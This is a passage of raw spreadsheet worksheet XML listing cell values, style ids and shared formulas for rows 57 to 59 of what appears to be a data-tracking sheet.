      <c r="DW57" s="356" t="s">
        <v>1049</v>
      </c>
      <c r="DX57" s="356" t="s">
        <v>1050</v>
      </c>
      <c r="DY57" s="356" t="str">
        <f t="shared" si="12"/>
        <v>2034857, -</v>
      </c>
      <c r="DZ57" s="356">
        <v>2034857</v>
      </c>
      <c r="EA57" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB57" s="356">
        <v>1</v>
      </c>
      <c r="EC57" s="357">
        <v>17</v>
      </c>
      <c r="ED57" s="357">
        <v>5</v>
      </c>
      <c r="EE57" s="357">
        <v>2</v>
      </c>
      <c r="EF57" s="357">
        <v>0</v>
      </c>
      <c r="EG57" s="357">
        <f t="shared" si="13"/>
        <v>2</v>
      </c>
      <c r="EH57" s="357">
        <v>6</v>
      </c>
      <c r="EI57" s="357">
        <v>2</v>
      </c>
      <c r="EJ57" s="357">
        <v>2</v>
      </c>
      <c r="EK57" s="357">
        <v>16</v>
      </c>
      <c r="EL57" s="357">
        <v>16</v>
      </c>
      <c r="EM57" s="358">
        <v>2</v>
      </c>
      <c r="EN57" s="368" t="str">
        <f t="shared" si="16"/>
        <v>SI</v>
      </c>
      <c r="EO57" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP57" s="369"/>
      <c r="EQ57" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER57" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES57" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET57" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU57" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV57" s="369"/>
      <c r="EW57" s="369">
        <v>15511</v>
      </c>
      <c r="EX57" s="369"/>
      <c r="EY57" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ57" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA57" s="369"/>
      <c r="FB57" s="369"/>
      <c r="FC57" s="369">
        <v>7</v>
      </c>
      <c r="FD57" s="369">
        <f t="shared" si="15"/>
        <v>3</v>
      </c>
      <c r="FE57" s="369">
        <v>0</v>
      </c>
      <c r="FF57" s="369">
        <v>3</v>
      </c>
      <c r="FG57" s="369">
        <v>3</v>
      </c>
      <c r="FH57" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI57" s="377" t="str">
        <f t="shared" si="17"/>
        <v>SI</v>
      </c>
      <c r="FJ57" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK57" s="378"/>
      <c r="FL57" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM57" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN57" s="378"/>
      <c r="FO57" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP57" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ57" s="378"/>
      <c r="FR57" s="380" t="s">
        <v>1052</v>
      </c>
      <c r="FS57" s="380"/>
      <c r="FT57" s="380"/>
      <c r="FU57" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV57" s="378"/>
      <c r="FW57" s="378"/>
      <c r="FX57" s="378">
        <v>7</v>
      </c>
      <c r="FY57" s="378">
        <f t="shared" si="20"/>
        <v>1</v>
      </c>
      <c r="FZ57" s="378">
        <v>0</v>
      </c>
      <c r="GA57" s="378" t="s">
        <v>391</v>
      </c>
      <c r="GB57" s="378">
        <v>1</v>
      </c>
      <c r="GC57" s="379" t="s">
        <v>12</v>
      </c>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c r="IW57" s="40"/>
      <c r="IX57" s="40"/>
      <c r="IY57" s="40"/>
      <c r="IZ57" s="40"/>
      <c r="JA57" s="40"/>
      <c r="JB57" s="40"/>
      <c r="JC57" s="40"/>
      <c r="JD57" s="40"/>
      <c r="JE57" s="40"/>
      <c r="JF57" s="40"/>
      <c r="JG57" s="40"/>
      <c r="JH57" s="40"/>
      <c r="JI57" s="40"/>
      <c r="JJ57" s="40"/>
      <c r="JK57" s="40"/>
      <c r="JL57" s="40"/>
      <c r="JM57" s="40"/>
      <c r="JN57" s="40"/>
      <c r="JO57" s="40"/>
      <c r="JP57" s="40"/>
      <c r="JQ57" s="40"/>
      <c r="JR57" s="40"/>
      <c r="JS57" s="40"/>
      <c r="JT57" s="40"/>
      <c r="JU57" s="40"/>
      <c r="JV57" s="40"/>
      <c r="JW57" s="40"/>
      <c r="JX57" s="40"/>
      <c r="JY57" s="40"/>
      <c r="JZ57" s="40"/>
      <c r="KA57" s="40"/>
      <c r="KB57" s="40"/>
      <c r="KC57" s="40"/>
      <c r="KD57" s="40"/>
      <c r="KE57" s="40"/>
      <c r="KF57" s="40"/>
      <c r="KG57" s="40"/>
      <c r="KH57" s="40"/>
      <c r="KI57" s="40"/>
      <c r="KJ57" s="40"/>
      <c r="KK57" s="40"/>
      <c r="KL57" s="40"/>
      <c r="KM57" s="40"/>
      <c r="KN57" s="40"/>
      <c r="KO57" s="40"/>
      <c r="KP57" s="40"/>
      <c r="KQ57" s="40"/>
      <c r="KR57" s="40"/>
      <c r="KS57" s="40"/>
      <c r="KT57" s="40"/>
      <c r="KU57" s="40"/>
      <c r="KV57" s="40"/>
      <c r="KW57" s="40"/>
      <c r="KX57" s="40"/>
      <c r="KY57" s="40"/>
      <c r="KZ57" s="40"/>
      <c r="LA57" s="40"/>
      <c r="LB57" s="40"/>
      <c r="LC57" s="40"/>
      <c r="LD57" s="40"/>
      <c r="LE57" s="40"/>
      <c r="LF57" s="40"/>
      <c r="LG57" s="40"/>
      <c r="LH57" s="40"/>
      <c r="LI57" s="40"/>
    </row>
    <row r="58" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B58" s="224" t="s">
        <v>860</v>
      </c>
      <c r="C58" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D58" s="225" t="s">
        <v>861</v>
      </c>
      <c r="E58" s="225" t="s">
        <v>1053</v>
      </c>
      <c r="F58" s="225">
        <v>35</v>
      </c>
      <c r="G58" s="225" t="s">
        <v>1054</v>
      </c>
      <c r="H58" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I58" s="225"/>
      <c r="J58" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K58" s="227" t="s">
        <v>1055</v>
      </c>
      <c r="L58" s="228" t="s">
        <v>185</v>
      </c>
      <c r="M58" s="227" t="s">
        <v>1056</v>
      </c>
      <c r="N58" s="227" t="s">
        <v>1057</v>
      </c>
      <c r="O58" s="389" t="s">
        <v>2705</v>
      </c>
      <c r="P58" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q58" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R58" s="225"/>
      <c r="S58" s="396"/>
      <c r="T58" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U58" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V58" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W58" s="231"/>
      <c r="X58" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y58" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z58" s="256" t="s">
        <v>1058</v>
      </c>
      <c r="AA58" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB58" s="256" t="s">
        <v>2459</v>
      </c>
      <c r="AC58" s="226" t="s">
        <v>1059</v>
      </c>
      <c r="AD58" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE58" s="259" t="s">
        <v>1063</v>
      </c>
      <c r="AF58" s="270" t="s">
        <v>1060</v>
      </c>
      <c r="AG58" s="225" t="s">
        <v>1061</v>
      </c>
      <c r="AH58" s="271" t="s">
        <v>1062</v>
      </c>
      <c r="AI58" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ58" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK58" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL58" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM58" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN58" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO58" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP58" s="230"/>
      <c r="AQ58" s="230"/>
      <c r="AR58" s="288">
        <v>3</v>
      </c>
      <c r="AS58" s="288">
        <v>1</v>
      </c>
      <c r="AT58" s="288">
        <v>0</v>
      </c>
      <c r="AU58" s="288">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="AV58" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW58" s="288">
        <v>1</v>
      </c>
      <c r="AX58" s="288">
        <v>1</v>
      </c>
      <c r="AY58" s="288">
        <v>0</v>
      </c>
      <c r="AZ58" s="288">
        <f>AX58+AY58</f>
        <v>1</v>
      </c>
      <c r="BA58" s="289"/>
      <c r="BB58" s="301">
        <v>0</v>
      </c>
      <c r="BC58" s="302">
        <v>0</v>
      </c>
      <c r="BD58" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE58" s="302">
        <v>0</v>
      </c>
      <c r="BF58" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG58" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH58" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI58" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ58" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK58" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL58" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM58" s="302">
        <v>0</v>
      </c>
      <c r="BN58" s="304">
        <v>3</v>
      </c>
      <c r="BO58" s="304">
        <v>0</v>
      </c>
      <c r="BP58" s="304">
        <v>0</v>
      </c>
      <c r="BQ58" s="304">
        <v>0</v>
      </c>
      <c r="BR58" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS58" s="304">
        <v>0</v>
      </c>
      <c r="BT58" s="304">
        <v>0</v>
      </c>
      <c r="BU58" s="304">
        <v>0</v>
      </c>
      <c r="BV58" s="305">
        <v>0</v>
      </c>
      <c r="BW58" s="317">
        <v>0</v>
      </c>
      <c r="BX58" s="318">
        <v>0</v>
      </c>
      <c r="BY58" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ58" s="318">
        <v>0</v>
      </c>
      <c r="CA58" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB58" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC58" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD58" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE58" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF58" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG58" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH58" s="318">
        <v>0</v>
      </c>
      <c r="CI58" s="319">
        <v>3</v>
      </c>
      <c r="CJ58" s="319">
        <v>0</v>
      </c>
      <c r="CK58" s="319">
        <v>0</v>
      </c>
      <c r="CL58" s="319">
        <v>0</v>
      </c>
      <c r="CM58" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN58" s="319">
        <v>0</v>
      </c>
      <c r="CO58" s="319">
        <v>0</v>
      </c>
      <c r="CP58" s="319">
        <v>0</v>
      </c>
      <c r="CQ58" s="319">
        <v>0</v>
      </c>
      <c r="CR58" s="319">
        <v>0</v>
      </c>
      <c r="CS58" s="320">
        <v>0</v>
      </c>
      <c r="CT58" s="339">
        <v>0</v>
      </c>
      <c r="CU58" s="340">
        <v>0</v>
      </c>
      <c r="CV58" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW58" s="340">
        <v>0</v>
      </c>
      <c r="CX58" s="340"/>
      <c r="CY58" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ58" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA58" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB58" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC58" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD58" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE58" s="340">
        <v>0</v>
      </c>
      <c r="DF58" s="341">
        <v>3</v>
      </c>
      <c r="DG58" s="341">
        <v>0</v>
      </c>
      <c r="DH58" s="341">
        <v>0</v>
      </c>
      <c r="DI58" s="341">
        <v>0</v>
      </c>
      <c r="DJ58" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK58" s="341">
        <v>0</v>
      </c>
      <c r="DL58" s="341">
        <v>0</v>
      </c>
      <c r="DM58" s="341">
        <v>0</v>
      </c>
      <c r="DN58" s="341">
        <v>0</v>
      </c>
      <c r="DO58" s="341">
        <v>0</v>
      </c>
      <c r="DP58" s="342">
        <v>0</v>
      </c>
      <c r="DQ58" s="355">
        <v>9</v>
      </c>
      <c r="DR58" s="356">
        <v>0</v>
      </c>
      <c r="DS58" s="356" t="s">
        <v>619</v>
      </c>
      <c r="DT58" s="356">
        <v>3</v>
      </c>
      <c r="DU58" s="356"/>
      <c r="DV58" s="356" t="s">
        <v>619</v>
      </c>
      <c r="DW58" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX58" s="356" t="s">
        <v>619</v>
      </c>
      <c r="DY58" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ58" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA58" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB58" s="356">
        <v>0</v>
      </c>
      <c r="EC58" s="357">
        <v>3</v>
      </c>
      <c r="ED58" s="357">
        <v>2</v>
      </c>
      <c r="EE58" s="357">
        <v>0</v>
      </c>
      <c r="EF58" s="357">
        <v>0</v>
      </c>
      <c r="EG58" s="357">
        <f t="shared" si="13"/>
        <v>0</v>
      </c>
      <c r="EH58" s="357">
        <v>2</v>
      </c>
      <c r="EI58" s="357">
        <v>0</v>
      </c>
      <c r="EJ58" s="357">
        <v>0</v>
      </c>
      <c r="EK58" s="357">
        <v>9</v>
      </c>
      <c r="EL58" s="357">
        <v>9</v>
      </c>
      <c r="EM58" s="358">
        <v>0</v>
      </c>
      <c r="EN58" s="368" t="str">
        <f t="shared" si="16"/>
        <v>SI</v>
      </c>
      <c r="EO58" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP58" s="369"/>
      <c r="EQ58" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER58" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES58" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET58" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU58" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV58" s="369"/>
      <c r="EW58" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX58" s="369"/>
      <c r="EY58" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ58" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA58" s="369"/>
      <c r="FB58" s="369"/>
      <c r="FC58" s="369">
        <v>0</v>
      </c>
      <c r="FD58" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE58" s="369">
        <v>0</v>
      </c>
      <c r="FF58" s="369">
        <v>0</v>
      </c>
      <c r="FG58" s="369">
        <v>0</v>
      </c>
      <c r="FH58" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI58" s="377" t="str">
        <f t="shared" si="17"/>
        <v>SI</v>
      </c>
      <c r="FJ58" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK58" s="378"/>
      <c r="FL58" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM58" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN58" s="378"/>
      <c r="FO58" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP58" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ58" s="378"/>
      <c r="FR58" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS58" s="380"/>
      <c r="FT58" s="380"/>
      <c r="FU58" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV58" s="378"/>
      <c r="FW58" s="378"/>
      <c r="FX58" s="378">
        <v>0</v>
      </c>
      <c r="FY58" s="378">
        <f t="shared" si="20"/>
        <v>0</v>
      </c>
      <c r="FZ58" s="378">
        <v>0</v>
      </c>
      <c r="GA58" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB58" s="378">
        <v>0</v>
      </c>
      <c r="GC58" s="379" t="s">
        <v>12</v>
      </c>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J58" s="40"/>
      <c r="JK58" s="40"/>
      <c r="JL58" s="40"/>
      <c r="JM58" s="40"/>
      <c r="JN58" s="40"/>
      <c r="JO58" s="40"/>
      <c r="JP58" s="40"/>
      <c r="JQ58" s="40"/>
      <c r="JR58" s="40"/>
      <c r="JS58" s="40"/>
      <c r="JT58" s="40"/>
      <c r="JU58" s="40"/>
      <c r="JV58" s="40"/>
      <c r="JW58" s="40"/>
      <c r="JX58" s="40"/>
      <c r="JY58" s="40"/>
      <c r="JZ58" s="40"/>
      <c r="KA58" s="40"/>
      <c r="KB58" s="40"/>
      <c r="KC58" s="40"/>
      <c r="KD58" s="40"/>
      <c r="KE58" s="40"/>
      <c r="KF58" s="40"/>
      <c r="KG58" s="40"/>
      <c r="KH58" s="40"/>
      <c r="KI58" s="40"/>
      <c r="KJ58" s="40"/>
      <c r="KK58" s="40"/>
      <c r="KL58" s="40"/>
      <c r="KM58" s="40"/>
      <c r="KN58" s="40"/>
      <c r="KO58" s="40"/>
      <c r="KP58" s="40"/>
      <c r="KQ58" s="40"/>
      <c r="KR58" s="40"/>
      <c r="KS58" s="40"/>
      <c r="KT58" s="40"/>
      <c r="KU58" s="40"/>
      <c r="KV58" s="40"/>
      <c r="KW58" s="40"/>
      <c r="KX58" s="40"/>
      <c r="KY58" s="40"/>
      <c r="KZ58" s="40"/>
      <c r="LA58" s="40"/>
      <c r="LB58" s="40"/>
      <c r="LC58" s="40"/>
      <c r="LD58" s="40"/>
      <c r="LE58" s="40"/>
      <c r="LF58" s="40"/>
      <c r="LG58" s="40"/>
      <c r="LH58" s="40"/>
      <c r="LI58" s="40"/>
    </row>
    <row r="59" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B59" s="224" t="s">
        <v>496</v>
      </c>
      <c r="C59" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D59" s="225" t="s">
        <v>497</v>
      </c>
      <c r="E59" s="225" t="s">
        <v>1064</v>
      </c>
      <c r="F59" s="233">
        <v>75</v>
      </c>
      <c r="G59" s="225" t="s">
        <v>1065</v>
      </c>
      <c r="H59" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I59" s="225"/>
      <c r="J59" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K59" s="227" t="s">
        <v>1066</v>
      </c>
      <c r="L59" s="228" t="s">
        <v>12</v>
      </c>
      <c r="M59" s="227" t="s">
        <v>1067</v>
      </c>
      <c r="N59" s="227" t="s">
        <v>2408</v>
      </c>
      <c r="O59" s="389"/>
      <c r="P59" s="393" t="s">
        <v>186</v>
      </c>
      <c r="Q59" s="233" t="s">
        <v>191</v>
      </c>
      <c r="R59" s="233"/>
      <c r="S59" s="398"/>
      <c r="T59" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U59" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V59" s="231" t="s">
        <v>2602</v>
      </c>
      <c r="W59" s="231"/>
      <c r="X59" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y59" s="255" t="s">
        <v>422</v>
      </c>
      <c r="Z59" s="256" t="s">
        <v>2460</v>
      </c>
      <c r="AA59" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB59" s="256" t="s">
        <v>2461</v>
      </c>
      <c r="AC59" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD59" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE59" s="259" t="s">
        <v>1069</v>
      </c>
      <c r="AF59" s="270" t="s">
        <v>458</v>
      </c>
      <c r="AG59" s="225" t="s">
        <v>458</v>
      </c>
      <c r="AH59" s="271" t="s">
        <v>1068</v>
      </c>
      <c r="AI59" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ59" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK59" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL59" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM59" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN59" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO59" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP59" s="230"/>
      <c r="AQ59" s="230"/>
      <c r="AR59" s="288">
        <v>116</v>
      </c>
      <c r="AS59" s="288">
        <v>112</v>
      </c>
      <c r="AT59" s="288">
        <v>0</v>
      </c>
      <c r="AU59" s="288">
        <f t="shared" si="5"/>
        <v>112</v>
      </c>
      <c r="AV59" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW59" s="288">
        <v>11053</v>
      </c>
      <c r="AX59" s="288">
        <v>11053</v>
      </c>
      <c r="AY59" s="288">
        <v>0</v>
      </c>
      <c r="AZ59" s="288">
        <v>11053</v>
      </c>
      <c r="BA59" s="289"/>
      <c r="BB59" s="301">
        <v>0</v>
      </c>
      <c r="BC59" s="302">
        <v>0</v>
      </c>
      <c r="BD59" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE59" s="302">
        <v>0</v>
      </c>
      <c r="BF59" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG59" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH59" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI59" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ59" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK59" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL59" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM59" s="302">
        <v>0</v>
      </c>
      <c r="BN59" s="304">
        <v>116</v>
      </c>
      <c r="BO59" s="304">
        <v>0</v>
      </c>
      <c r="BP59" s="304">
        <v>0</v>
      </c>
      <c r="BQ59" s="304">
        <v>0</v>
      </c>
      <c r="BR59" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS59" s="304">
        <v>0</v>
      </c>
      <c r="BT59" s="304">
        <v>0</v>
      </c>
      <c r="BU59" s="304">
        <v>0</v>
      </c>
      <c r="BV59" s="305">
        <v>0</v>
      </c>
      <c r="BW59" s="324">
        <v>5505</v>
      </c>
      <c r="BX59" s="318">
        <v>0</v>
      </c>
      <c r="BY59" s="325">
        <v>2009714</v>
      </c>
      <c r="BZ59" s="325">
        <v>1</v>
      </c>
      <c r="CA59" s="325" t="s">
        <v>13</v>
      </c>
      <c r="CB59" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC59" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD59" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE59" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF59" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG59" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH59" s="318">
        <v>0</v>
      </c>
      <c r="CI59" s="319">
        <v>116</v>
      </c>
      <c r="CJ59" s="319">
        <v>112</v>
      </c>
      <c r="CK59" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CL59" s="319">
        <v>0</v>
      </c>
      <c r="CM59" s="319" t="e">
        <f t="shared" si="9"/>
        <v>#VALUE!</v>
      </c>
      <c r="CN59" s="319">
        <v>5505</v>
      </c>
      <c r="CO59" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CP59" s="319">
        <v>0</v>
      </c>
      <c r="CQ59" s="319">
        <v>5505</v>
      </c>
      <c r="CR59" s="319">
        <v>5505</v>
      </c>
      <c r="CS59" s="320" t="s">
        <v>12</v>
      </c>
      <c r="CT59" s="339">
        <v>17114</v>
      </c>
      <c r="CU59" s="340">
        <v>0</v>
      </c>
      <c r="CV59" s="340" t="s">
        <v>1070</v>
      </c>
      <c r="CW59" s="340">
        <v>6</v>
      </c>
      <c r="CX59" s="340"/>
      <c r="CY59" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ59" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA59" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB59" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC59" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD59" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE59" s="340">
        <v>0</v>
      </c>
      <c r="DF59" s="341">
        <v>116</v>
      </c>
      <c r="DG59" s="341">
        <v>112</v>
      </c>
      <c r="DH59" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DI59" s="341">
        <v>0</v>
      </c>
      <c r="DJ59" s="341" t="e">
        <f t="shared" si="11"/>
        <v>#VALUE!</v>
      </c>
      <c r="DK59" s="341">
        <v>5507</v>
      </c>
      <c r="DL59" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DM59" s="341">
        <v>11609</v>
      </c>
      <c r="DN59" s="341">
        <v>5505</v>
      </c>
      <c r="DO59" s="341" t="s">
        <v>12</v>
      </c>
      <c r="DP59" s="342" t="s">
        <v>12</v>
      </c>
      <c r="DQ59" s="355">
        <v>17179</v>
      </c>
      <c r="DR59" s="356">
        <v>0</v>
      </c>
      <c r="DS59" s="356" t="s">
        <v>1071</v>
      </c>
      <c r="DT59" s="356">
        <v>10</v>
      </c>
      <c r="DU59" s="356"/>
      <c r="DV59" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DW59" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX59" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DY59" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ59" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA59" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB59" s="356">
        <v>0</v>
      </c>
      <c r="EC59" s="357">
        <v>116</v>
      </c>
      <c r="ED59" s="357">
        <v>112</v>
      </c>
      <c r="EE59" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EF59" s="357">
        <v>0</v>
      </c>
      <c r="EG59" s="357" t="e">
        <f t="shared" si="13"/>
        <v>#VALUE!</v>
      </c>
      <c r="EH59" s="357">
        <v>5549</v>
      </c>
      <c r="EI59" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EJ59" s="357">
        <v>11609</v>
      </c>
      <c r="EK59" s="357">
        <v>5570</v>
      </c>
      <c r="EL59" s="357" t="s">
        <v>12</v>
      </c>
      <c r="EM59" s="358" t="s">
        <v>12</v>
      </c>
      <c r="EN59" s="368" t="str">
        <f t="shared" si="16"/>
        <v>SI</v>
      </c>
      <c r="EO59" s="369">
        <v>224</v>
      </c>
      <c r="EP59" s="369"/>
      <c r="EQ59" s="369">
        <v>17702</v>
      </c>
      <c r="ER59" s="369">
        <v>1</v>
      </c>
      <c r="ES59" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET59" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU59" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV59" s="369"/>
      <c r="EW59" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX59" s="369"/>
      <c r="EY59" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ59" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA59" s="369"/>
      <c r="FB59" s="369"/>
      <c r="FC59" s="369">
        <v>116</v>
      </c>
      <c r="FD59" s="369">
        <f t="shared" si="15"/>
        <v>112</v>
      </c>
      <c r="FE59" s="369">
        <v>112</v>
      </c>
      <c r="FF59" s="369">
        <v>0</v>
      </c>
      <c r="FG59" s="369">
        <v>112</v>
      </c>
      <c r="FH59" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI59" s="377" t="str">
        <f t="shared" si="17"/>
        <v>SI</v>
      </c>
      <c r="FJ59" s="378">
        <v>10895</v>
      </c>
      <c r="FK59" s="378"/>
      <c r="FL59" s="378" t="s">
        <v>1072</v>
      </c>
      <c r="FM59" s="378">
        <v>4</v>
      </c>
      <c r="FN59" s="378"/>
      <c r="FO59" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP59" s="378" t="s">
        <v>1072</v>
      </c>
      <c r="FQ59" s="378"/>
      <c r="FR59" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS59" s="380"/>
      <c r="FT59" s="380"/>
      <c r="FU59" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV59" s="378"/>
      <c r="FW59" s="378"/>
      <c r="FX59" s="378">
        <v>115</v>
      </c>
      <c r="FY59" s="378">
        <f t="shared" si="20"/>
        <v>112</v>
      </c>
      <c r="FZ59" s="378">
        <v>112</v>
      </c>
      <c r="GA59" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB59" s="378">
        <v>112</v>
      </c>
      <c r="GC59" s="379" t="s">
        <v>12</v>
      </c>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0"/>
      <c r="JN59" s="40"/>
      <c r="JO59" s="40"/>
      <c r="JP59" s="40"/>
      <c r="JQ59" s="40"/>
      <c r="JR59" s="40"/>
      <c r="JS59" s="40"/>
      <c r="JT59" s="40"/>
      <c r="JU59" s="40"/>
      <c r="JV59" s="40"/>
      <c r="JW59" s="40"/>
      <c r="JX59" s="40"/>
      <c r="JY59" s="40"/>
      <c r="JZ59" s="40"/>
      <c r="KA59" s="40"/>
      <c r="KB59" s="40"/>
      <c r="KC59" s="40"/>
      <c r="KD59" s="40"/>
      <c r="KE59" s="40"/>
      <c r="KF59" s="40"/>
      <c r="KG59" s="40"/>
      <c r="KH59" s="40"/>
